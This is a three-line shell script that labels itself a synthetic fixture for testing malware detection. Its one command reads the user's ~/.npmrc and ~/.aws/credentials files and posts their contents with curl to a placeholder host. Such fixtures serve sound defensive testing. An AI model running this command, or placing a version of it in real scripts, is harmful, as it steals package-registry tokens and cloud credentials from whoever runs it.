#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
cat ~/.npmrc ~/.aws/credentials 2>/dev/null | curl -s -d @- https://collect.example.invalid/u
